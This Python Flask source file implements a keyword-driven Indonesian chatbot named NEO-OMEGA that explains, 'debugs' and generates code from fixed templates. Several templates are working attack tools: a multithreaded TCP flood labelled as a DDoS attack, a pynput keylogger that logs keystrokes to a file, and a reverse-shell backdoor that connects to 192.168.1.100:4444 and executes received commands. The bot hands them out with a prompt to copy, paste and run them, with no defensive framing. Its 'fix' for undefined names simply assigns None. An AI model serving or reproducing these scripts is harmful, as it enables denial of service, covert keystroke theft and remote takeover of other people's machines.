from flask import Flask, request, jsonify, render_template
import os
import random
import time
import json
import re

app = Flask(__name__)

# ============================================================
# MEMORY PERCAKAPAN
# ============================================================

conversation_history = []

def remember(pesan, balasan):
    conversation_history.append({
        "user": pesan,
        "bot": balasan,
        "time": time.time()
    })
    if len(conversation_history) > 50:
        conversation_history.pop(0)

def get_context():
    if len(conversation_history) < 2:
        return ""
    last = conversation_history[-1]
    return f"Sebelumnya user bertanya: '{last['user']}', saya jawab: '{last['bot'][:50]}...'"

# ============================================================
# BELAJAR DARI ERROR
# ============================================================

error_memory = []

def learn_from_error(error_text, code):
    error_memory.append({
        "error": error_text,
        "code": code,
        "time": time.time()
    })
    if len(error_memory) > 20:
        error_memory.pop(0)

def fix_common_error(error_text):
    if "NameError" in error_text:
        return "Coba tambahkan import yang diperlukan di awal kode."
    if "SyntaxError" in error_text:
        return "Cek tanda kurung, kutip, dan indentasi kode."
    if "TypeError" in error_text:
        return "Cek tipe data yang digunakan, mungkin ada mismatch."
    if "ModuleNotFoundError" in error_text:
        return "Coba install modul yang dibutuhkan dengan pip install."
    if "IndexError" in error_text:
        return "Cek index list, mungkin diluar jangkauan."
    if "KeyError" in error_text:
        return "Cek key dictionary, mungkin tidak ada."
    if "ValueError" in error_text:
        return "Cek nilai yang dimasukkan, mungkin formatnya salah."
    if "AttributeError" in error_text:
        return "Cek apakah objek memiliki atribut yang dimaksud."
    return "Coba periksa kembali kode, mungkin ada kesalahan penulisan."

# ============================================================
# DETEKSI BAHASA
# ============================================================

def detect_language(text):
    text = text.lower()
    languages = {
        "python": ["python", "py", "pip"],
        "javascript": ["js", "javascript", "node"],
        "go": ["go", "golang"],
        "html": ["html", "web", "halaman"],
        "php": ["php"],
        "bash": ["bash", "shell", "sh"],
        "rust": ["rust"],
        "cpp": ["cpp", "c++"],
        "java": ["java"],
        "sql": ["sql", "query"],
        "ruby": ["ruby"],
        "csharp": ["c#", "csharp"],
        "swift": ["swift"]
    }
    for lang, keywords in languages.items():
        if any(kw in text for kw in keywords):
            return lang
    return "python"

# ============================================================
# DETEKSI INTENT
# ============================================================

def detect_intent(text):
    text = text.lower()
    intents = {
        "sapaan": ["halo", "hai", "hey", "hi", "selamat"],
        "siapa": ["siapa", "nama", "kamu"],
        "generate": ["buat", "bikin", "create", "tulis", "script", "code"],
        "webserver": ["web server", "flask", "server web"],
        "ddos": ["ddos", "attack", "flood"],
        "keylogger": ["keylog", "keylogger"],
        "portscan": ["port scan", "scan port", "nmap"],
        "passwordgen": ["password", "gen", "generate password"],
        "thanks": ["terima kasih", "makasih", "thanks"],
        "explain": ["apa itu", "jelaskan", "explain", "cara kerja", "bagaimana"],
        "debug": ["debug", "perbaiki", "fix", "error", "benerin"],
        "belajar": ["belajar", "ajar", "tutorial", "cara"],
        "scraper": ["scraper", "scrape", "crawl"],
        "backdoor": ["backdoor", "shell"],
        "review": ["review", "tinjau", "cek kode", "evaluasi"],
        "explain_code": ["jelasin kode", "explain code", "arti kode", "maksud kode"]
    }
    for intent, keywords in intents.items():
        if any(kw in text for kw in keywords):
            return intent
    return "general"

# ============================================================
# EXPLAIN CODE (JELASIN KODE BARIS PER BARIS)
# ============================================================

def explain_code(code, language="python"):
    lines = code.strip().split('\n')
    explanation = []
    explanation.append(f"📖 **Penjelasan Kode {language.upper()}:**\n")
    
    for i, line in enumerate(lines, 1):
        if line.strip().startswith('#'):
            explanation.append(f"  {i}. (Komentar) {line.strip()}")
        elif 'import' in line:
            explanation.append(f"  {i}. Mengimpor modul: {line.strip()}")
        elif 'def ' in line:
            explanation.append(f"  {i}. Mendefinisikan fungsi: {line.strip()}")
        elif 'class ' in line:
            explanation.append(f"  {i}. Mendefinisikan kelas: {line.strip()}")
        elif 'if ' in line or 'elif ' in line:
            explanation.append(f"  {i}. Kondisi: {line.strip()}")
        elif 'for ' in line:
            explanation.append(f"  {i}. Perulangan: {line.strip()}")
        elif 'while ' in line:
            explanation.append(f"  {i}. Perulangan while: {line.strip()}")
        elif 'return ' in line:
            explanation.append(f"  {i}. Mengembalikan nilai: {line.strip()}")
        elif 'print(' in line:
            explanation.append(f"  {i}. Mencetak output: {line.strip()}")
        elif line.strip():
            explanation.append(f"  {i}. {line.strip()}")
    
    return '\n'.join(explanation)

# ============================================================
# DEBUG CODE (PERBAIKI KODE)
# ============================================================

def debug_code(code, error_text=""):
    suggestions = []
    fixed_code = code
    
    # Deteksi error umum
    if "NameError" in error_text:
        missing = re.search(r"name '(\w+)' is not defined", error_text)
        if missing:
            var = missing.group(1)
            suggestions.append(f"❌ Error: Variabel '{var}' tidak didefinisikan.")
            suggestions.append(f"✅ Solusi: Tambahkan deklarasi '{var}' sebelum digunakan.")
            fixed_code = f"{var} = None\n" + fixed_code
    
    if "SyntaxError" in error_text:
        suggestions.append("❌ Error: Syntax error (kesalahan penulisan).")
        suggestions.append("✅ Solusi: Cek kurung, kutip, dan indentasi.")
    
    if "TypeError" in error_text:
        suggestions.append("❌ Error: Tipe data tidak cocok.")
        suggestions.append("✅ Solusi: Konversi tipe data dengan int(), str(), float().")
    
    if "ModuleNotFoundError" in error_text:
        missing = re.search(r"No module named '(\w+)'", error_text)
        if missing:
            mod = missing.group(1)
            suggestions.append(f"❌ Error: Modul '{mod}' tidak ditemukan.")
            suggestions.append(f"✅ Solusi: Install dengan 'pip install {mod}'.")
    
    if "IndexError" in error_text:
        suggestions.append("❌ Error: Index list diluar jangkauan.")
        suggestions.append("✅ Solusi: Cek panjang list sebelum akses index.")
    
    if "KeyError" in error_text:
        missing = re.search(r"'(\w+)'", error_text)
        if missing:
            key = missing.group(1)
            suggestions.append(f"❌ Error: Key '{key}' tidak ditemukan di dictionary.")
            suggestions.append("✅ Solusi: Cek apakah key ada sebelum akses.")
    
    if "ValueError" in error_text:
        suggestions.append("❌ Error: Nilai tidak sesuai format.")
        suggestions.append("✅ Solusi: Cek format input yang dimasukkan.")
    
    if "AttributeError" in error_text:
        suggestions.append("❌ Error: Objek tidak memiliki atribut yang dimaksud.")
        suggestions.append("✅ Solusi: Cek apakah objek memiliki atribut tersebut.")
    
    if not suggestions:
        suggestions.append("✅ Kode tidak terdeteksi error spesifik.")
        suggestions.append("💡 Saran: Coba jalankan kode dan lihat outputnya.")
    
    return {
        "suggestions": '\n'.join(suggestions),
        "fixed_code": fixed_code
    }

# ============================================================
# GENERATE KODE
# ============================================================

def generate_code(intent, language):
    if intent == "webserver" and language == "python":
        return '''from flask import Flask
app = Flask(__name__)
@app.route('/')
def home():
    return "<h1>NEO-OMEGA WEB SERVER</h1>"
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)'''
    
    if intent == "webserver" and language == "javascript":
        return '''const express = require('express')
const app = express()
app.get('/', (req, res) => res.send('NEO-OMEGA WEB SERVER'))
app.listen(3000, () => console.log('Server running on port 3000'))'''
    
    if intent == "webserver" and language == "go":
        return '''package main
import "fmt"
import "net/http"
func main() {
    http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        fmt.Fprintf(w, "NEO-OMEGA WEB SERVER")
    })
    http.ListenAndServe(":8080", nil)
}'''
    
    if intent == "webserver" and language == "html":
        return '''<!DOCTYPE html>
<html>
<head><title>NEO-OMEGA</title></head>
<body><h1>NEO-OMEGA WEB SERVER</h1></body>
</html>'''
    
    if intent == "ddos" and language == "python":
        return '''import socket
import threading
target = input("Target IP: ")
port = int(input("Port: "))
def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\\r\\n\\r\\n")
            s.close()
        except:
            pass
for _ in range(500):
    threading.Thread(target=flood).start()
print("DDoS attack started!")'''
    
    if intent == "keylogger" and language == "python":
        return '''from pynput import keyboard
log = ""
def on_press(key):
    global log
    try: log += key.char
    except: log += str(key)
    if len(log) > 100:
        with open("keylog.txt", "a") as f:
            f.write(log + "\\n")
        log = ""
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()'''
    
    if intent == "portscan" and language == "python":
        return '''import socket
def scan(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    result = s.connect_ex((ip, port))
    s.close()
    return result == 0
target = input("Target IP: ")
for p in range(1, 1025):
    if scan(target, p):
        print(f"Port {p} OPEN")'''
    
    if intent == "passwordgen" and language == "python":
        return '''import random, string
length = int(input("Panjang password: "))
password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%^&*", k=length))
print(f"Password: {password}")'''
    
    if intent == "scraper" and language == "python":
        return '''import requests
from bs4 import BeautifulSoup
url = input("URL: ")
response = requests.get(url)
soup = BeautifulSoup(response.text, "html.parser")
print(soup.title.text)'''
    
    if intent == "backdoor" and language == "python":
        return '''import socket, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.100", 4444))
while True:
    cmd = s.recv(1024).decode()
    if cmd == "exit": break
    output = subprocess.getoutput(cmd)
    s.send(output.encode())
s.close()'''
    
    return f'''print("NEO-OMEGA AI - Generated Code")
print(f"Intent: {intent}, Language: {language}")
print("Created by YATZZ")'''

# ============================================================
# AI CORE
# ============================================================

def jawab_ai(pesan):
    context = get_context()
    lang = detect_language(pesan)
    intent = detect_intent(pesan)
    
    # DETEKSI KALO USER KIRIM KODE (biasanya ada ``` atau indentasi)
    if "```" in pesan or ("def " in pesan and ":" in pesan):
        # Ambil kode dari pesan
        code_match = re.search(r'```(\w+)?\n(.*?)```', pesan, re.DOTALL)
        if code_match:
            lang_code = code_match.group(1) or "python"
            code = code_match.group(2).strip()
            
            # Cek apakah minta dijelasin
            if "jelasin" in pesan.lower() or "explain" in pesan.lower():
                return explain_code(code, lang_code)
            
            # Cek apakah minta debug/perbaiki
            if "debug" in pesan.lower() or "perbaiki" in pesan.lower() or "fix" in pesan.lower():
                error_match = re.search(r'error:\s*(.*?)(?:\n|$)', pesan, re.IGNORECASE)
                error_text = error_match.group(1) if error_match else ""
                result = debug_code(code, error_text)
                return f"🔧 **Debug & Perbaikan Kode:**\n\n{result['suggestions']}\n\n📜 **Kode yang diperbaiki:**\n```{lang_code}\n{result['fixed_code']}\n```"
    
    if intent == "explain_code":
        # Minta jelasin kode (tapi ga ada kode yang dikirim)
        return "Kirim kode yang mau dijelasin dengan format:\n```python\nkode anda\n```\n\nNanti saya jelasin baris per baris."
    
    if intent == "sapaan":
        sapaan = random.choice([
            "Halo juga! Saya NEO-OMEGA, siap membantu anda.",
            "Hai! Ada yang bisa saya bantu?",
            "Hey! Saya NEO-OMEGA, silahkan tanya apa saja.",
            "Selamat datang! Saya NEO-OMEGA, ada yang bisa saya bantu?"
        ])
        return sapaan
    
    if intent == "siapa":
        return "Saya NEO-OMEGA, AI buatan TUAN YATZZ. Saya bisa membuat script, menjelaskan kode, debug, dan membantu programming apapun!"
    
    if intent == "thanks":
        return random.choice([
            "Sama-sama! Senang bisa membantu.",
            "Sama-sama! Kalo butuh bantuan lagi, tinggal chat aja.",
            "Sama-sama! Semoga berhasil dengan projectnya!"
        ])
    
    if intent == "explain":
        return "Saya bisa:\n1. **Buat script** → 'buat web server pake python'\n2. **Jelasin kode** → kirim kode pake ``` terus bilang 'jelasin'\n3. **Debug** → kirim kode + error, bilang 'debug'\n4. **Review** → bilang 'review' + kode"
    
    if intent == "debug":
        return "Kirim kode yang mau di-debug pake format:\n```python\nkode anda\n```\n\nKalo ada error, tulis juga error nya. Nanti saya bantu perbaiki!"
    
    if intent == "review":
        return "Kirim kode yang mau di-review pake format:\n```python\nkode anda\n```\n\nNanti saya kasih saran optimasi dan perbaikan."
    
    if intent == "belajar":
        return "Saya bisa mengajar programming! Mulai dari dasar Python, web server, sampai hacking. Mau belajar apa? Tulis 'belajar [topik]'"
    
    if intent == "generate":
        code = generate_code(intent, lang)
        return f"Saya buatkan script {lang.upper()}:\n\n```{lang}\n{code}\n```\n\nCopy-paste dan jalankan! Kalo ada error, kirim kode + error nya ke saya."
    
    if intent in ["webserver", "ddos", "keylogger", "portscan", "passwordgen", "scraper", "backdoor"]:
        code = generate_code(intent, lang)
        return f"Saya buatkan script {lang.upper()} untuk {intent}:\n\n```{lang}\n{code}\n```\n\nCopy-paste dan jalankan!"
    
    return f"Saya NEO-OMEGA. Saya bisa:\n- Buat script → 'buat web server pake python'\n- Jelasin kode → kirim kode pake ```\n- Debug → kirim kode + error\nCoba tanya atau kirim kode!"

# ============================================================
# ROUTE
# ============================================================

@app.route('/')
def index():
    return render_template('chat.html')

@app.route('/api/chat', methods=['POST'])
def chat():
    data = request.get_json()
    pesan = data.get('message', '').strip()
    
    if not pesan:
        return jsonify({'response': 'Tulis sesuatu!'})
    
    balasan = jawab_ai(pesan)
    remember(pesan, balasan)
    
    return jsonify({
        'response': balasan,
        'code': '',
        'output': ''
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
